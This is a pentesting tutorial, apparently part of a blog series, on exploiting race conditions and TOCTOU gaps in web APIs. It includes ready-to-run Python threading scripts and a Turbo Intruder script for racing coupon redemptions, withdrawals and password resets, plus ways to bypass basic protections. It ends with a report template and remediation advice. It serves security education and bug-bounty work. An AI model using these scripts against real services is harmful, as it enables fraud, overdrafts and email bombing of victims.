# Race Conditions & TOCTOU: Exploiting the Gap Between Check and Use

> **Series:** 30-Day API Pentesting | **Day 23** | Week 4: Advanced Attacks  
> **Difficulty:** Intermediate  
> **Topic:** Race Conditions & TOCTOU (Time of Check to Time of Use)

---

## What is a Race Condition?

A race condition happens when two or more requests arrive at the server at almost exactly the same time, and both get a stale (outdated) view of the data before either of them updates it.

Think of it like two people withdrawing money from an ATM using the same account simultaneously:

```
Normal (sequential):
  Thread A: reads balance = $100
  Thread A: deducts $80  → balance = $20
  Thread B: reads balance = $20
  Thread B: tries to deduct $80 → DENIED (insufficient funds)

Race condition (parallel):
  Thread A: reads balance = $100   ←──── both read SAME value
  Thread B: reads balance = $100   ←──── before either updates
  Thread A: deducts $80 → balance = $20
  Thread B: also deducts $80 → balance = -$60  ← OVERDRAFT!

Result: $160 withdrawn from a $100 account
```

### What is TOCTOU?

**TOCTOU (Time Of Check To Time Of Use)** is the specific name for the race condition pattern where:

1. Server **CHECKS** a condition ("is this coupon still valid?")
2. There's a **GAP** in time (database latency, network delay, processing)
3. Server **USES** the resource (deducts the coupon)

The gap between step 1 and step 3 is your attack window. If you flood the server with requests during that gap, all of them pass the CHECK before any of them triggers the USE.

```
Server code that's vulnerable:
──────────────────────────────
def apply_coupon(code):
    coupon = db.query("SELECT * FROM coupons WHERE code=?", code)
    
    if coupon.is_used:           # ← CHECK happens here
        return error("already used")
    
    # ... processing happens here (5-20ms gap) ...
    
    db.execute("UPDATE coupons SET is_used=1 WHERE code=?", code)  # ← USE
    apply_discount_to_cart()
    return success()

Attack: send 50 concurrent requests → all hit the CHECK simultaneously
        coupon.is_used = False for all 50 → all pass → coupon used 50 times
```

---

## Why APIs Are Especially Vulnerable

REST APIs are designed to be **stateless** — each request is independent. This architecture, combined with modern async frameworks and microservices, makes race conditions harder to prevent and easier to exploit.

```
Contributing factors:
1. Async frameworks (Node.js, FastAPI) handle many requests concurrently
2. Database reads are cached → stale data served to concurrent requests
3. Microservices = multiple round trips = larger TOCTOU windows
4. No session locking between independent API requests
5. Rate limits are per-IP or per-user, not per-concurrent-request
```

---

## Part 1: Finding Race Condition Targets

### High-Value Targets to Look For

```
Category            Endpoint Pattern              What to Race
──────────────────────────────────────────────────────────────
Coupons/Promo       POST /coupon/apply            Single-use code
Withdrawals         POST /account/withdraw        Balance check
Referral bonuses    POST /referral/claim          One-time bonus
Free trials         POST /trial/activate          One per account
Vote/Like/Upvote    POST /post/{id}/like          One per user
Password reset      POST /auth/forgot-password    Token generation
OTP verification    POST /auth/verify-otp         Attempt limit
Gift cards          POST /gift/redeem             Single-use
Reward points       POST /points/redeem           Balance check
Flash sales         POST /checkout                Inventory check
```

### How to Identify a Two-Step Check+Use Operation

```bash
# Look for these patterns in API responses/requests:

# 1. Validation step then action step
POST /coupon/validate → {"valid": true, "discount": 50}
POST /coupon/apply    → {"applied": true, "cartTotal": 25}
# Two requests = two-step = race between them!

# 2. Read-then-write patterns
GET  /account/balance → {"balance": 100}
POST /account/withdraw → {"amount": 90}
# Gap between reading and writing = race window

# 3. Status checks before operations
GET  /invitation/abc123 → {"status": "pending", "validFor": "user@test.com"}
POST /invitation/abc123/accept → {"status": "accepted"}
# Race the accept endpoint with multiple users
```

---

## Part 2: Executing Race Condition Attacks

### Method 1: Python Threading (Beginner-Friendly)

```python
#!/usr/bin/env python3
"""Race Condition Tester — sends N concurrent requests simultaneously"""
import requests
import threading
import time

TARGET   = "https://api.target.com"
TOKEN    = "Bearer YOUR_TOKEN"
HEADERS  = {"Authorization": TOKEN, "Content-Type": "application/json"}
RESULTS  = []
LOCK     = threading.Lock()

def send_coupon_request(thread_id):
    """Single coupon redemption attempt"""
    try:
        resp = requests.post(
            f"{TARGET}/api/v1/coupon/apply",
            headers=HEADERS,
            json={"code": "FIRST50", "cartId": "CART-001"},
            timeout=10
        )
        with LOCK:
            RESULTS.append({
                "thread": thread_id,
                "status": resp.status_code,
                "body":   resp.text[:100]
            })
    except Exception as e:
        with LOCK:
            RESULTS.append({"thread": thread_id, "error": str(e)})

def race_attack(target_func, num_threads=50):
    """
    Launch N threads and start them all at the exact same moment.
    The barrier ensures threads start simultaneously, not sequentially.
    """
    threads = []
    
    # Create all threads
    for i in range(num_threads):
        t = threading.Thread(target=target_func, args=(i,))
        threads.append(t)
    
    # Start all at the same moment
    print(f"[*] Launching {num_threads} concurrent requests...")
    start = time.time()
    for t in threads:
        t.start()
    
    # Wait for all to complete
    for t in threads:
        t.join()
    
    elapsed = time.time() - start
    print(f"[*] All done in {elapsed:.2f}s")
    return RESULTS

# Run the attack
results = race_attack(send_coupon_request, num_threads=50)

# Analyze results
successes = [r for r in results if r.get("status") == 200]
failures  = [r for r in results if r.get("status") != 200]

print(f"\n=== RESULTS ===")
print(f"Successes: {len(successes)}")
print(f"Failures:  {len(failures)}")

if len(successes) > 1:
    print(f"\n!!! RACE CONDITION FOUND !!!")
    print(f"Coupon applied {len(successes)} times from one account!")
    for s in successes[:5]:
        print(f"  Thread {s['thread']}: {s['body'][:60]}")
```

### Method 2: Using a Barrier for True Simultaneity

```python
import requests, threading

TARGET  = "https://api.target.com"
HEADERS = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}
N = 50
barrier = threading.Barrier(N)  # All threads wait here until ALL are ready
results = []
lock = threading.Lock()

def race_request():
    barrier.wait()  # All N threads wait here — then ALL release simultaneously!
    resp = requests.post(f"{TARGET}/api/v1/withdraw",
                         headers=HEADERS,
                         json={"amount": 90, "accountId": "MY-ACCT"})
    with lock:
        results.append(resp.status_code)

threads = [threading.Thread(target=race_request) for _ in range(N)]
for t in threads: t.start()
for t in threads: t.join()

successes = results.count(200)
print(f"Successful withdrawals: {successes} / {N}")
print(f"Expected: 1, Got: {successes}")
if successes > 1:
    print(f"RACE CONDITION: withdrew {successes * 90} from $100 account!")
```

### Method 3: Burp Suite — Send Group in Parallel

```
This is the most accurate method for a true single-packet attack:

1. In Burp Suite, create a "Tab Group":
   - Open your target request in Repeater
   - Duplicate it 20 times (Ctrl+D)
   - All tabs in the group share the same base request

2. Click the dropdown next to "Send" button
   → "Send group in parallel (single-packet attack)"
   This sends ALL requests in a single TCP packet
   → Server receives all 20 at the exact same millisecond
   → Maximum race condition probability

3. Analyze responses in each tab:
   - If only 1 tab shows "success" → race mitigated
   - If multiple tabs show "success" → race condition confirmed!

Note: Single-packet attack requires HTTP/2 (most modern APIs support it)
For HTTP/1.1, use "Send group in sequence (last-byte sync)" instead
```

### Method 4: Turbo Intruder Race Script

```python
# Use this in Burp's Turbo Intruder (Extensions → Turbo Intruder)
# Right-click any request → Extensions → Send to Turbo Intruder

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=50,
        requestsPerConnection=1,
        pipeline=False,
        engine=Engine.THREADED
    )
    
    # Queue 50 identical requests
    for i in range(50):
        engine.queue(target.req, None, gate='race')
    
    # Open the gate — release all 50 simultaneously
    engine.openGate('race')

def handleResponse(req, interesting):
    if req.status == 200 and 'success' in req.response.lower():
        table.add(req)
```

---

## Part 3: Specific Attack Scenarios with Code

### Scenario 1: Single-Use Coupon Race

```python
import requests, threading

TARGET  = "https://api.target.com"
TOKEN   = "Bearer YOUR_TOKEN"
HEADERS = {"Authorization": TOKEN, "Content-Type": "application/json"}

# First apply coupon normally to confirm it works once
resp = requests.post(f"{TARGET}/api/coupon/apply",
    headers=HEADERS, json={"code": "HALFOFF", "cartId": "CART-999"})
print(f"Initial apply: {resp.status_code} | {resp.json().get('discount')}")

# Now create a NEW cart and race the coupon
NEW_CART = "CART-NEW-001"
results = []
lock = threading.Lock()
barrier = threading.Barrier(30)

def apply_coupon():
    barrier.wait()
    r = requests.post(f"{TARGET}/api/coupon/apply",
        headers=HEADERS, json={"code": "HALFOFF", "cartId": NEW_CART})
    with lock:
        results.append(r.status_code)

threads = [threading.Thread(target=apply_coupon) for _ in range(30)]
for t in threads: t.start()
for t in threads: t.join()

print(f"Successes: {results.count(200)} / 30")
# If coupon shows as 50% off multiple times in NEW_CART → race condition!
```

### Scenario 2: Balance Overdraft Race

```python
import requests, threading

TARGET  = "https://api.target.com"
TOKEN   = "Bearer YOUR_TOKEN"
HEADERS = {"Authorization": TOKEN, "Content-Type": "application/json"}

# Check starting balance
balance_before = requests.get(f"{TARGET}/api/account/balance",
    headers=HEADERS).json()["balance"]
print(f"Balance before: ${balance_before}")

# Race 5 withdrawals of $90 each from a $100 balance
# Normally only 1 should succeed
results = []
lock = threading.Lock()
barrier = threading.Barrier(5)

def withdraw():
    barrier.wait()  # All start simultaneously
    r = requests.post(f"{TARGET}/api/account/withdraw",
        headers=HEADERS, json={"amount": 90})
    with lock:
        results.append({"status": r.status_code, "body": r.text[:80]})

threads = [threading.Thread(target=withdraw) for _ in range(5)]
for t in threads: t.start()
for t in threads: t.join()

# Check balance after
balance_after = requests.get(f"{TARGET}/api/account/balance",
    headers=HEADERS).json()["balance"]

successes = len([r for r in results if r["status"] == 200])
print(f"\nSuccessful withdrawals: {successes}")
print(f"Balance after:  ${balance_after}")
print(f"Expected: ${balance_before - 90:.2f}")
print(f"Actual:   ${balance_after:.2f}")

if successes > 1:
    profit = (successes * 90) - (balance_before - balance_after)
    print(f"\nRACE CONDITION! Extra money withdrawn: ${profit:.2f}")
```

### Scenario 3: Password Reset Token Race

```python
import requests, threading, re

TARGET  = "https://api.target.com"

# Some apps generate a predictable or limited number of reset tokens
# If you can trigger token generation multiple times simultaneously,
# you might get multiple valid tokens — or invalidate each other

results = []
lock = threading.Lock()
barrier = threading.Barrier(10)

def request_reset():
    barrier.wait()
    r = requests.post(f"{TARGET}/api/auth/forgot-password",
        json={"email": "victim@target.com"},
        headers={"Content-Type": "application/json"})
    with lock:
        results.append({"status": r.status_code, "body": r.text[:100]})

threads = [threading.Thread(target=request_reset) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()

# Check: all 200? Does the victim receive 10 reset emails?
# Even if not exploitable for ATO, mass email bombing is a valid bug report
successes = [r for r in results if r["status"] == 200]
print(f"Reset requests: {len(successes)}/10 succeeded")
print("If victim gets 10 emails → email bombing via race → Medium severity")
```

---

## Part 4: Detecting Race Condition Fixes (Bypass Attempts)

### When the Server Has Basic Protection

```python
# Protection 1: Server returns "already processing" for concurrent requests
# Bypass: add slight delay between requests (1-10ms)
import time

def staggered_race(num=20, delay_ms=5):
    threads = []
    for i in range(num):
        t = threading.Thread(target=send_request)
        threads.append(t)
    
    # Start with tiny offsets instead of perfectly simultaneous
    for i, t in enumerate(threads):
        t.start()
        time.sleep(delay_ms / 1000)  # 5ms stagger
    
    for t in threads:
        t.join()

# Protection 2: Idempotency keys
# If server enforces unique idempotency keys per request:
# Each request must have a UNIQUE key — prevents exact duplicates
# Bypass: use slightly different cart IDs or user agents

# Protection 3: Database-level locking (SELECT FOR UPDATE)
# This is the proper fix — hard to bypass
# If all your concurrent requests return only 1 success → properly fixed
```

---

## Part 5: Reporting Race Conditions

### Impact Assessment

```
Severity depends on what the race enables:

Critical: Financial loss (overdraft, double-spend, free purchases)
High:     Account takeover via token race, free premium access
Medium:   Coupon abuse, vote manipulation, referral fraud  
Low:      Email bombing via password reset race
```

### Report Template

```
Title: Race Condition in POST /api/coupon/apply Allows Single-Use 
       Coupon to be Redeemed Multiple Times

Severity: High

Description:
The coupon redemption endpoint is vulnerable to a TOCTOU (Time-of-Check
to Time-of-Use) race condition. The endpoint checks whether a coupon 
has been used in a database read, then marks it as used in a separate 
write operation. When 50 concurrent requests are sent simultaneously,
all 50 pass the "is_used = false" check before any marks it as used,
allowing a single-use coupon to be applied 50 times.

Steps to Reproduce:
1. Obtain a valid single-use coupon code: HALFOFF (50% discount)
2. Confirm initial state: coupon shows is_used = false
3. Run the following Python script:
   [script from above sending 50 concurrent requests]
4. Observe 47 out of 50 requests return HTTP 200 with discount applied
5. Check cart total: 50% discount applied 47 times
   → Effective price: near zero for any product

Impact:
Any user can obtain a single-use promotional code and apply it 
effectively unlimited times. This allows purchasing any product at 
near-zero cost, causing direct financial loss to the business.

Proof of Concept:
[Screenshot showing 47 out of 50 requests returning 200 OK]
[Screenshot showing cart with extreme discount applied]

Remediation:
- Use database-level locking: SELECT FOR UPDATE or atomic transactions
- Implement idempotency keys for coupon redemption
- Use Redis SETNX for atomic single-operation check-and-set
- Queue coupon redemptions rather than processing concurrently
```

---

## Checklist

```
☐  Find single-use resources — coupons, referrals, free trials, one-time links
☐  Find balance check+use ops — withdraw, transfer, spend points — two-step operations
☐  Test with Python threading — 10-50 concurrent requests to same endpoint
☐  Use Burp parallel group — group identical requests → Send in parallel
☐  Try HTTP/2 single packet — all requests in one TCP packet = true simultaneous
☐  Check final state delta — did balance change correctly? Was code used once?
☐  Try password reset race — 10 concurrent resets → email bomb or token collision
☐  Test vote/like endpoints — 100 concurrent likes from 1 account
☐  Check idempotency — does adding Idempotency-Key header prevent race?
☐  Try staggered timing — if simultaneous is blocked, try 5ms delay between requests
```

---

*Written by @anand87794*  
*30-Day API Pentesting Series — Day 23 of 30*
